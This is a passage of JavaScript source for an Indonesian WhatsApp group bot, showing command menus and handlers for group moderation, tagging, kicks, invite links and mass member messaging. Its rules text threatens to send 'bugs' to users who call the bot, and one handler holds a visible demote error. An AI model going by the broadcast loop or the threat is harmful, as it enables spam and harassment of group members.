╎╭୧⍤⃝───────────┈◦•◦❥•◦
╎│•⟢.kodebahasa
╎│•⟢.tts
╎│•⟢.toimg
╎│•⟢.tovn
╎│•⟢.tovideo
╎│•⟢.tomp3
╎│•⟢.togif
╎│•⟢.tourl
╎│•⟢.terbalik
╎│•⟢.bass
╎│•⟢.deep
╎│•⟢.earrape
╎│•⟢.fast
╎│•⟢.fat
╎│•⟢.nightcore
╎│•⟢.reverse
╎│•⟢.robot
╎│•⟢.slow
╎│•⟢.smooth
╎│•⟢.tupai
_________________________________

❍┈┈「 *MENU SETTINGS* 」
╎╭୧⍤⃝───────────┈◦•◦❥•◦
╎│•⟢.setbio
╎│•⟢.setppbot ❌
╎│•⟢.setnamebot
╎│•⟢.clearsesi
╎│•⟢.delsampah
_________________________________


❍┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈◙
❍┈┈「 *MENU STORAGE* 」
╎╭୧⍤⃝───────────┈◦•◦❥•◦
╎│•⟢.addvn
╎│•⟢.delvn
╎│•⟢.listvn
╎│•⟢.addimage
╎│•⟢.delimage
╎│•⟢.listimage
╎│•⟢.addvideo
╎│•⟢.delvideo
╎│•⟢.listvideo
╎│•⟢.addsticker
╎│•⟢.delsticker
╎│•⟢.liststicker
_________________________________


❍┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈◙
❍┈┈「 *MENU OWER* 」
╎╭୧⍤⃝───────────┈◦•◦❥•◦
╎│•⟢.getcase
╎│•⟢.addprem
╎│•⟢.delprem
╎│•⟢.public
╎│•⟢.self
╎│•⟢.addsewa
╎│•⟢.listsewa
╎│•⟢.ceksewa
╎│•⟢.bcgc
╎│•⟢.join
╎│•⟢.joincall
╎│•⟢.adderror
╎│•⟢.delerror
╎│•⟢.clearerror
╎│•⟢.listerror
╎│•⟢.addcmdowner
╎│•⟢.delcmdowner
╎│•⟢.listcmdowner
╎│•⟢.addcmdprem
╎│•⟢.delcmdprem
╎│•⟢.listcmdprem
╎│•⟢.addcmdlimit
╎│•⟢.delcmdlimit
╎│•⟢.listcmdlimit
_________________________________


`,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})
      }
      break

   case 'menu': case 'help':{
   if (!m.text.includes('.')) return;
      ehz.relayMessage(m.chat,  {
    requestPaymentMessage: {
      currencyCodeIso4217: 'INR',
      amount1000: 1234567,
      requestFrom: m.sender,
      noteMessage: {
      extendedTextMessage: {
      text: 
      `
╭୧──────────┈◦•◦
│✼ *Nomor :* ${sender.split("@")[0]}
│✼ *Nama Bot :* ${botName}
│✼ *Date :* ${week}, ${calender}
│✼ *Jumlah User:* User
│✼ *Fitur Saat ini :* ${totalFitur()}
│✼ *Status:* ${isPremium ? 'Premium user':'Free user'}
│✼ *Runtime :* ${runtime(process.uptime())}
│✼ *Limit Tersisa:* ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}`} limit
꒰⚘݄꒱₊___________________˓
`+readmore+`
         *MAIN MENU*

│•⟢.allmenu
│•⟢.tqto
│•⟢.sc
│•⟢.ping
│•⟢.runtime

`,
      contextInfo: {
      externalAdReply: {
      showAdAttribution: true
      }}}}}}, {})
      }
      break
	 

 case 'rules':{
   if (!m.text.includes('.')) return;
let teks =`
Syarat dan Ketentuan menggunakan *${fake}*

1. Nama dan nomer user ${fake}
akan Kami simpan di dalam
server selama bot aktif

2. Data akan di hapus ketika bot Offline
atau di hapus oleh Owner Bot

3. Kami tidak menyimpan gambar,
video, file, audio, dan dokumen
yang kamu kirim ke ${fake}

4. Kami tidak akan pernah meminta users
untuk memberikan informasi pribadi

5. Jika menemukan Bug/Error silahkan
langsung lapor ke Owner atau Developer
atau bisa juga memakai fitur _*reportbug*_

6. Beberapa fitur mungkin ada yang error,
jadi tunggu sampai developer
meperbaiki fitur tersebut

8. Bot ini sudah di lengkapi dengan
fitur _*Auto laporerror*_ jika terjadi
error maka bot akan auto report ke
developer, terkecuali error yang
menyebabkan bot mati, maka user
harus lapor ke developer

7. Bot ini juga sudah di lengkapi dengan
Fitur Anti Spam jika kamu terdeteksi
melakukan spam, maka Bot tidak
akan menanggapi kamu selama 20 detik

9. User dilarang keras menelpon bot!
jika melanggar maka kamu akan terkena
banned,block dan dikirim bug

10. Bot tidak akan menanggapi user yang
meminta untuk di save nomernya`
ehz.relayMessage(from, { liveLocationMessage: { 
degreesLatitude: 35.676570,
degreesLongitude: 139.762148,
caption : teks,
sequenceNumber: 1656662972682001, timeOffset: 8600, jpegThumbnail: null,
contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
containsAutoReply: true,
showAdAttribution: true,
}
}
}
}, { quoted: fkontak })
}
break
//=========== AREA GRUP NYA ===========//

case 'setppgc':{
if (!isGroupAdmins) return setReply(mess.only.admin)
if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
if (/image/.test(mime)){
let media = await ehz.downloadAndSaveMediaMessage(quoted,makeid(5))
await ehz.updateProfilePicture(from, { url: media })
.then( res => {
setReply(`Sukses`)
fs.unlinkSync(media)
}).catch(() => m.reply(mess.error.api))
} else {
setReply(`Kirim/balas gambar dengan caption ${command}`)
}
}
break
case 'setnamegc': {
if (!isGroup) return onlyGroup()
if (!isOwner && !isAdmins) return setReply(mess.only.admin)
if (!m.isGroup) return setReply(mess.only.group)
if (!isBotAdmins) return setReply(mess.only.badmin)
if (!q) return setReply('Text nya ?')
await ehz.groupUpdateSubject(from, q).then((res)).catch((err) => setReply(jsonformat(err)))
setReply(`Sukses Edit Subjek Grup✅`)
}
break
case 'infogc': {
if(!isGroup) return setReply("Hanya bisa di dalam group")
let _meta = await ehz.groupMetadata(from)
  console.log(_meta)
let _img = await ehz.profilePictureUrl(_meta.id, 'image') 
let caption = `${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter(x => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter(x => x.admin === null).length}* Not Admin\n\n` +
`Group ID : ${_meta.id}`
await ehz.sendMessage(from,{
caption,
image: await getBuffer(_img)
},
{ quoted: m }
)
}
break
case  'getppgc':
	if (!isGroup) return 
	setReply(mess.wait)
	try {
	var ppimg = await ehz.profilePictureUrl(from, 'image')
	} catch (err) {
	console.log(err)
	var ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
	}
	await ehz.sendMessage(from, { image: { url: ppimg }}, { quoted: m })
	break

case 'setdesc':{
if (!isGroup) return onlyGroup()
if (!isOwner && !isAdmins) return setReply(mess.only.admin)
if (!m.isGroup) return setReply(mess.only.group)
if (!isBotAdmins) return setReply(mess.only.badmin)
if (!q) return setReply('Text Nya ?')
await ehz.groupUpdateDescription(from, q).then((res)).catch((err) => setReply(jsonformat(err)))
setReply(`Sukses Edit Deskripsi Grup✅`)
}
break
if (!isGroup) return onlyGroup()
case 'gcsetting':{
  if (!m.text.includes('.')) return;
  if (!isGroup) return setReply(mess.group)
	if (!isGroupAdmins && !isOwner) return onlyAdmin()
	if (!isBotGroupAdmins) return setReply(mess.only.Badmin)
	if (!q) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
	if (args[0] == "close") {
	ehz.groupSettingUpdate(from, 'announcement')
	setReply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
	} else if (args[0] == "open") {
	ehz.groupSettingUpdate(from, 'not_announcement')
	setReply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
	} else {
	setReply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
	}
}
	break
case 'promote': {
if (!isGroup) return onlyGroup()
if (!isOwner && !isAdmins) return setReply(mess.only.admin)
if (!m.isGroup) return setReply(mess.only.group)
if (!isBotAdmins) return setReply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
await ehz.groupParticipantsUpdate(from, [users], 'promote')
setReply(`@${users} Naik Jabatan Menjadi Admin Group😎`)
}
break
case 'demote': {
if (!isGroup) return onlyGroup()
if (!isOwner && !isAdmins) return setReply(mess.only.admin)
if (!m.isGroup) return setReply(mess.only.group)
if (!isBotAdmins) return setReply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+"@s.whatsapp.net"
await ehz.groupParticipantsUpdate(from, [botNumber], 'demote')
setReply(`@${users} Turun Jabatan Menjadi Member Biasa🗿`)
}
break
case  'intro': {
if (!isGroup) return onlyGroup()
let teks = 'Member baru INTRO  :)\nNama lengkap:\nNama panggilan:\nHobi:\nUmur:\nGender:\nKelas:\nTinggi badan:\nBeratbadan :\nAgama:\nGolongan darah:\nStatus:\nNama pacar:\nJumlah mantan:\nNama mantan:\nNama bapak :\nNama ibu : \nNama kakak:\nKakak online:\nKakak kandung\tiri:\nJumlah kakak:\nNama adek:\nAdek online:\nAdek kandung\tiri:\nJumlah adek:\nNama kakek:\nKakek dari ayah :\nKakek dari ibu :\nNama nenek:\nNenek dari ayah :\nNenek dari ibu :\nNama bibi:\nBibi dari ayah :\nBibi dari ibu :\nNama paman:\nBibi dari ayah :\nBibi dari ibu :\nKTP:\nSIM:\nSTNK:\nBPKB:\nKK:\nAlamat rumah:\nRT:\nRW:\nKELURAHAN:\nKECAMATAN:\nKABUPATEN:\nKOTA:\nPROVINSI:\nPLANET:\nGALAXY:\nUNIVERSE:\nLANGIT:\nDARATAN:\nLAUTAN:\nKEPULAUAN:\nSAMUDRA:\nUKURAN SEPATU:\nUKURAN BAJU:\nUKURAN CELANA:\nLEBAR PINGGANG:\nPANJANG TANGAN:\nPANJANG KAKI:\nMAKANAN FAVORIT:\nMINUMAN FAVORIT:\nFILM FAVORIT:\nSINETRON FAVORIT:\nGAME FAVORIT:\nANIME FAVORIT:\nMANGA FAVORIT:\nMANHUA FAVORIT:\nMANHWA FAVORIT:\nCHANNEL YOUTUBE:\nINSTAGRAM:\nTWITTEER:\nFACEBOOK:\nMUSIC FAVORIT:\nSIFAT:\nSIKAP:\nZODIAK:\nTANGGAL LAHIR:\nMERK HP:\nMERK MOTOR:\nMERK MOBIL:\nTINGKAT RUMAH:\nALAMAT SEKOLAH:\nUkuran daleman:\nUkuran atasan :\nDiameter kepala :\nStatistik tubuh:\nDiameter perut :\nDiameter lengan :\nDiameter paha :\nDiameter lutut :\nDiameter betis:\nPanjang tangan :\nPanjang kaki :\nPanjang kepala :\nLebar hidung :\nCita cita :\nHobi :\nJenis hewanpeliharaan :\nNama hewan:\nDiameter rumah:\nWaifu:\nHusbu:\nLoli kesukaan :\nShota kesukaan :\nPunya brp teman :\nTeman online :\nTeman offline :\nTeman main game:\nTeman sekolah:\nTemen rumah:'
setReply(teks)
}
break    
case 'hidetag':
  if (!m.text.includes('.')) return;
if (!isGroup) return setReply(mess.only.group)
if (!isOwner) return setReply("undefined")
let mem = [];
groupMembers.map( i => mem.push(i.id) )
ehz.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case "tagall": {
  if (!m.text.includes('.')) return;
if (!isOwner) return setReply("undefined")
if (!isGroup) return setReply(mess.only.group)
if (!q) return setReply(`Teks Nya Mana Kak?`)
let teks = `${q ? q : ''} \n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
for (let mem of participants) {
teks += `⊝ @${mem.id.split('@')[0]}\n`
}
ehz.sendMessage(from, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'kick': {
  if (!m.text.includes('.')) return;
if (!isOwner) return setReply("undefined")
if (!m.isGroup) return setReply(mess.only.group)
if (!isBotAdmins) return setReply(mess.only.badmin)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await ehz.groupParticipantsUpdate(from, [users], 'remove')
}
break
case 'linkgroup': case 'linkgc':{
if (!isOwner && !isAdmins) return setReply(mess.only.admin)
if (!m.isGroup) return setReply(mess.only.group)
if (!isBotAdmins) return setReply(mess.only.badmin)
let response = await ehz.groupInviteCode(from)
ehz.sendText(from, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
case 'resetlinkgroup': case 'resetlinkgc':{
if (!isOwner && !isAdmins) return setReply(mess.only.admin)
if (!m.isGroup) return setReply(mess.only.group)
if (!isBotAdmins) return setReply(mess.only.badmin)
ehz.groupRevokeInvite(from)
}
break
case 'bcmem':{
      if (!isGroup) return m.reply(mess.only.group)
        if (!isOwner) return m.reply(mess.owner);
        if (!q) return m.reply(`Teks Nya Bang?\nContoh: ${prefix+command} Hallo`);
 setReply("waitt.....! sedang memuat")
        let mem = [];
	    groupMembers.map( i => mem.push(i.id) )
       // let anu = await store.chats.all().map((v) => v.id);
        for (let yoi of mem) {
          if (yoi.includes('.net')) {
          	await sleep (6000)
            ehz.sendMessage(yoi, {text: `${q}`});
          }
        }
        m.reply(`Succes`);
        }
        break;
case 'jadian': {
if (!isGroup) return onlyGroup()
if (!m.text.includes('.')) return;
let member = groupMembers.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang jadian ❤️ Jangan lupa pajak jadiannya yee

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
ehz.sendMessage(from, { text: jawab, mentions: menst },{quoted: m}) 
}
break
case 'jodohku':{
if (!isGroup) return onlyGroup()
let member = groupMembers.map(u => u.id)
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Jodoh kamu adalah @${jodoh.split('@')[0]}`
let menst = [jodoh]
